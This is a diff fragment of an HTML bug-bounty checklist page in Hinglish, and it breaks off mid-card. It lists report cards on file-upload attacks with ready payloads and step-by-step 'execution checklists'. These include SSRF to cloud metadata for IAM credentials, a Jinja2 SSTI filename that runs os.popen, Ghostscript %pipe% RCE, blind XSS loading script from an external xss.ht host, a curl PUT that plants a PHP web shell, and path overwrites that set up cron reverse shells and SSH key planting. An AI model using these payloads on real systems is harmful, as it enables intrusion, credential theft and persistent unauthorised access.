+                    <div class="report-title">SSRF via Remote File Upload - Cloud Credential Theft</div>
+                    <div class="report-target">Target: Cloud CRM - $6,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Import from URL</span><span
+                            class="technique-tag">169.254.169.254</span><span class="technique-tag">DNS Rebinding</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">"Import from URL" feature. URL: <code
+                            class="c">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</code>.
+                        Backend socha "Image URL hai" - request bheji - Access Key, Secret Key, Session Token mile -
+                        Full Cloud Takeover!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Import features dhoondho</strong> - Profile pics, Link previews,
+                            Logo fetchers.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Localhost test karo</strong> - <code
+                                class="c">http://127.0.0.1:80</code>, <code class="c">http://localhost:22</code> port
+                            scan.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Cloud metadata IP</strong> - <code
+                                class="c">169.254.169.254</code> hamesha try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Redirect bypass karo</strong> - Apni site se 302 redirect to
+                            internal IP.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Gopher protocol</strong> - Server <code class="c">gopher://</code>
+                            support karta hai? SQLi/Redis hack!</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-19">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #19</div>
+                    <div class="report-title">HTML-to-PDF Internal SSRF - Jenkins Exposed</div>
+                    <div class="report-target">Target: Logistics Giant - $5,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">&lt;iframe&gt;</span><span
+                            class="technique-tag">Headless Chrome</span><span class="technique-tag">Internal
+                            Network</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">"Custom Invoice" - Generate PDF (Headless Chrome/wkhtmltopdf). Address
+                        field mein: <code
+                            class="c">&lt;iframe src="http://172.16.0.1:8080/jenkins" width="800"&gt;</code>. Server
+                        internal network mein - Jenkins bina password ke dikh gaya - PDF mein screenshot embed!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>PDF converters dhoondho</strong> - Invoices, Resumes, Receipt
+                            generators target karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>iframe/object test karo</strong> - <code
+                                class="c">&lt;iframe src="..."&gt;</code>, <code
+                                class="c">&lt;object data="..."&gt;</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Port scanning karo</strong> - 80, 443, 8080, 6379 par response
+                            time dekho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Blacklist bypass</strong> - <code class="c">http://0.0.0.0</code>,
+                            Decimal IP <code class="c">http://2130706433</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>JS execution check karo</strong> - XMLHttpRequest se data leak
+                            possible?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-20">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #20</div>
+                    <div class="report-title">SSTI via Filename - Template Injection RCE</div>
+                    <div class="report-target">Target: Developer Portfolio - $4,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">{{7*7}}</span><span
+                            class="technique-tag">Jinja2</span><span class="technique-tag">os.popen()</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Filename <code class="c">{{7*7}}.jpg</code> upload - Server reply:
+                        "Success: <strong>49</strong>.jpg uploaded!" Math calculate kiya = Jinja2 engine. RCE Filename:
+                        <code
+                            class="c">{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}.jpg</code>
+                        - Full RCE!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Engine detect karo</strong> - <code class="c">${7*7}</code>, <code
+                                class="c">{{7*7}}</code>, <code class="c">&lt;%= 7*7 %&gt;</code> try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Framework identify karo</strong> - Jinja2 (Python), Twig (PHP),
+                            ERB (Ruby) errors.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Reflection check karo</strong> - Filename Success message, Email,
+                            Dashboard mein dikhta hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Filter bypass karo</strong> - <code class="c">.</code> ya <code
+                                class="c">_</code> block? <code class="c">request['args']</code> se pass.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Metadata mein SSTI</strong> - Filename ke alawa EXIF tags mein bhi
+                            {{}} payloads dalo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- PHASE 5 - ENGINE-SPECIFIC EXPLOITS -->
+<section class="phase-section" id="phase5">
+    <div class="phase-header"><span class="phase-number">PHASE 05</span><span class="phase-title">ENGINE-SPECIFIC
+            EXPLOITS - Ghostscript / File Collision / IPTC XSS / FFmpeg / Font SSRF</span><span class="phase-count"
+            id="p5count">0 / 5 reports</span></div>
+    <div class="cards-grid" id="grid-phase5">
+
+        <div class="report-card" data-severity="critical" id="report-21">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #21</div>
+                    <div class="report-title">Ghostscript Delegate Injection - Print Preview RCE</div>
+                    <div class="report-target">Target: Printing & Publishing - $6,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">%pipe%</span><span
+                            class="technique-tag">PostScript</span><span class="technique-tag">EPS Format</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">"Print Preview" - EPS/PDF/AI accept. Extension <code
+                            class="c">.jpg</code> par andar PostScript + <code
+                            class="c">/OutputFile (%pipe%id) .putdeviceparams</code>. <code class="c">%pipe%</code>
+                        command Ghostscript ko shell mein bhejta - error mein <code class="c">uid=33(www-data)</code>
+                        print! Full RCE!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Supported formats check karo</strong> - <code
+                                class="c">.eps</code>, <code class="c">.pdf</code>, <code class="c">.ps</code>, <code
+                                class="c">.ai</code> allow?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>PostScript header test karo</strong> - <code
+                                class="c">%!PS-Adobe</code> dalo, extension .jpg rakho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>%pipe% use karo</strong> - Ghostscript mein command execution ka
+                            main rasta.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>GS version check karo</strong> - 9.24 se niche = goldmine.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>LFI fallback</strong> - RCE nahi? PostScript se <code
+                                class="c">/etc/passwd</code> read try karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-22">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #22</div>
+                    <div class="report-title">Predictable Filename Collision - Admin File Overwrite</div>
+                    <div class="report-target">Target: Cloud Sync Service - $3,800 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">MD5(user+time)</span><span
+                            class="technique-tag">Hash Collision</span><span class="technique-tag">Overwrite</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Upload - renamed <code class="c">a123b.jpg</code> sequential pattern!
+                        Server: <code class="c">MD5(Username + CurrentTime)</code>. Admin avatar URL dhoondha - same
+                        hash generate karke shell upload - server ne purani file overwrite - admin avatar page = shell
+                        execute!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Filenames analyze karo</strong> - 5-6 files upload, pattern
+                            (Date/Time/UserID) dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Hash type identify karo</strong> - MD5 (32 chars), SHA1 (40
+                            chars)?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Time sync karo</strong> - Server ke <code class="c">Date</code>
+                            header se timestamp match karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Race condition overwrite</strong> - Same files ek saath upload -
+                            overwrite ya error?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Original name retention</strong> - Agar rename nahi karta toh
+                            <code class="c">config.php</code> upload karo!</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-23">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #23</div>
+                    <div class="report-title">IPTC Metadata Blind XSS - CMS Admin Hijack</div>
+                    <div class="report-target">Target: Global News Network - $3,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Caption-Abstract</span><span
+                            class="technique-tag">XSS Hunter</span><span class="technique-tag">WebP Bypass</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">EXIF stripped par IPTC preserved (SEO ke liye). ExifTool: <code
+                            class="c">-IPTC:Caption-Abstract='&lt;script src="bhai.xss.ht"&gt;&lt;/script&gt;'</code>.
+                        Image support ticket mein upload. 3 din baad - XSS Hunter ping - Admin Panel URL + Cookies +
+                        Screenshot! Full CMS Takeover!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>IPTC support check karo</strong> - ExifTool se dekho IPTC tags
+                            save ho rahe?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>XSS Hunter use karo</strong> - Blind XSS ke liye external logger
+                            (xss.ht) hamesha.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Multiple tags inject karo</strong> - Caption, Headline, By-line,
+                            Copyright sab mein.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>HTML breakout</strong> - Tag start mein <code
+                                class="c">"&gt;</code> dalo attribute se bahar niklo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>WebP format try karo</strong> - Purane metadata strippers WebP
+                            clean karna bhool jate hain!</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-24">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #24</div>
+                    <div class="report-title">FFmpeg HLS Playlist Injection - Video App LFI</div>
+                    <div class="report-target">Target: Video Streaming App - $7,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">#EXTM3U</span><span
+                            class="technique-tag">BYTERANGE</span><span class="technique-tag">/etc/passwd in
+                            video</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Video upload - server process (FFmpeg). Malicious <code
+                            class="c">.m3u8</code> renamed to <code class="c">.mp4</code>. FFmpeg ne <code
+                            class="c">/etc/passwd</code> ko "video segment" samjha - output video ke frames mein
+                        Sensitive Users List render!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Video engine identify karo</strong> - Error mein "FFmpeg" ya
+                            "Libav" dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>HLS playlists target karo</strong> - <code class="c">.m3u8</code>,
+                            <code class="c">.pls</code> files.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Local files read karo</strong> - <code
+                                class="c">file:///etc/passwd</code>, <code class="c">C:/Windows/win.ini</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>SSRF probe karo</strong> - Internal URLs se latency measure
+                            karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Concat protocol bypass</strong> - <code class="c">file://</code>
+                            block? concat se do files join karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-25">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #25</div>
+                    <div class="report-title">SSRF via Remote Font/SVG Resource - Cloud Key Leak</div>
+                    <div class="report-target">Target: Design & Prototyping Tool - $5,200 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">@font-face</span><span
+                            class="technique-tag">Skia/Cairo</span><span class="technique-tag">AI Engine Exploit</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">SVG mein <code
+                            class="c">@font-face{src:url('http://169.254.169.254/latest/meta-data/iam/...')}</code>.
+                        Server preview banane mein "font fetch" kiya - internal metadata request - AWS IAM Credentials
+                        fetch!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Engine identify karo</strong> - Skia, Cairo, Sharp (Node.js) use
+                            ho raha?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>@font-face test karo</strong> - SVG mein external font URLs try
+                            karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>XML entities check karo</strong> - SVG mein <code
+                                class="c">&lt;!ENTITY&gt;</code> allow? XXE + SSRF!</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>DNS Rebinding use karo</strong> - IP block? Domain name se bypass
+                            karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Outbound monitor karo</strong> - VPS par tcpdump/Burp Collaborator
+                            se request check.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section><!-- PHASE 6 - ARCHIVE & OVERWRITE ATTACKS -->
+<section class="phase-section" id="phase6">
+    <div class="phase-header"><span class="phase-number">PHASE 06</span><span class="phase-title">ARCHIVE & OVERWRITE
+            ATTACKS - Symlink / HTTP PUT / foreignObject / Absolute Path / Polyglot King</span><span class="phase-count"
+            id="p6count">0 / 5 reports</span></div>
+    <div class="cards-grid" id="grid-phase6">
+
+        <div class="report-card" data-severity="critical" id="report-26">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #26</div>
+                    <div class="report-title">Symlink Attack via Archive - Config File Read</div>
+                    <div class="report-target">Target: CI/CD Platform - $5,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">ln -s /etc/passwd</span><span
+                            class="technique-tag">tar czf</span><span class="technique-tag">Build Pipeline</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">CI/CD pipeline - .tar.gz upload. Archive mein symlink: <code
+                            class="c">ln -s /etc/passwd link.txt</code>. Server extract kiya - <code
+                            class="c">link.txt</code> ko read kiya - actual <code class="c">/etc/passwd</code> content
+                        return! Database config, API keys sab readable!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Archive upload dhoondho</strong> - CI/CD, Plugin uploads, Theme
+                            uploads target karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Symlink create karo</strong> - <code
+                                class="c">ln -s /etc/passwd link.txt && tar czf evil.tar.gz link.txt</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Multiple targets try karo</strong> - <code
+                                class="c">/proc/self/environ</code>, <code class="c">.env</code>, <code
+                                class="c">config.php</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Directory symlink test karo</strong> - Poora <code
+                                class="c">/etc/</code> folder link karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Write access check karo</strong> - Symlink se write bhi kar sakte
+                            ho kya?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-27">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #27</div>
+                    <div class="report-title">HTTP PUT Method - Direct File Write RCE</div>
+                    <div class="report-target">Target: Legacy Enterprise App - $4,200 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">PUT /shell.php</span><span
+                            class="technique-tag">WebDAV</span><span class="technique-tag">OPTIONS Enum</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text"><code class="c">OPTIONS /uploads/</code> response: <code
+                            class="c">Allow: GET, POST, PUT, DELETE</code>. PUT method enabled! <code
+                            class="c">curl -X PUT -d '&lt;?php system($_GET["c"])?&gt;' target.com/uploads/shell.php</code>
+                        - 201 Created - Direct shell upload bina form ke!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>OPTIONS method check karo</strong> - <code class="c">Allow</code>
+                            header mein PUT/DELETE hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>PUT se file upload karo</strong> - <code
+                                class="c">curl -X PUT -d 'test' target.com/uploads/test.txt</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>WebDAV enumerate karo</strong> - PROPFIND, MKCOL, COPY, MOVE
+                            methods try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Extension restrictions bypass</strong> - <code
+                                class="c">.php</code> block? <code class="c">.phtml</code>, <code class="c">.php5</code>
+                            try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>DELETE method test karo</strong> - Critical files delete karke DoS
+                            prove karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-28">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #28</div>
+                    <div class="report-title">SVG foreignObject XSS - Advanced Sanitizer Bypass</div>
+                    <div class="report-target">Target: Social Platform - $3,000 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">&lt;foreignObject&gt;</span><span
+                            class="technique-tag">xhtml:body</span><span class="technique-tag">DOMPurify Bypass</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">DOMPurify sanitizer - <code class="c">&lt;script&gt;</code> block. Par
+                        <code class="c">&lt;foreignObject&gt;</code> ke andar <code
+                            class="c">&lt;body xmlns="http://www.w3.org/1999/xhtml" onload="alert(document.cookie)"&gt;</code>
+                        - Sanitizer ne miss kiya - XSS execute!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Sanitizer identify karo</strong> - DOMPurify, Bleach,
+                            sanitize-html konsa use ho raha?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>foreignObject inject karo</strong> - SVG ke andar XHTML namespace
+                            use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Namespace confusion test karo</strong> - Math + SVG + HTML mixed
+                            namespace.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Mutation XSS try karo</strong> - Browser DOM parsing differences
+                            exploit karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Encoding bypass</strong> - HTML entities, Unicode escapes, double
+                            encoding try karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-29">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #29</div>
+                    <div class="report-title">Absolute Path Overwrite - System File Replacement</div>
+                    <div class="report-target">Target: Web Hosting Panel - $6,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">/var/www/html/</span><span
+                            class="technique-tag">Cron Overwrite</span><span class="technique-tag">SSH Key Plant</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Upload parameter mein filename: <code
+                            class="c">/var/www/html/index.php</code>. Server ne path sanitize nahi kiya - file seedha
+                        web root mein land! Cron file overwrite: <code class="c">/etc/cron.d/reverse</code> - har minute
+                        reverse shell! SSH key plant: <code class="c">/root/.ssh/authorized_keys</code> - permanent
+                        access!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Absolute path test karo</strong> - Filename mein <code
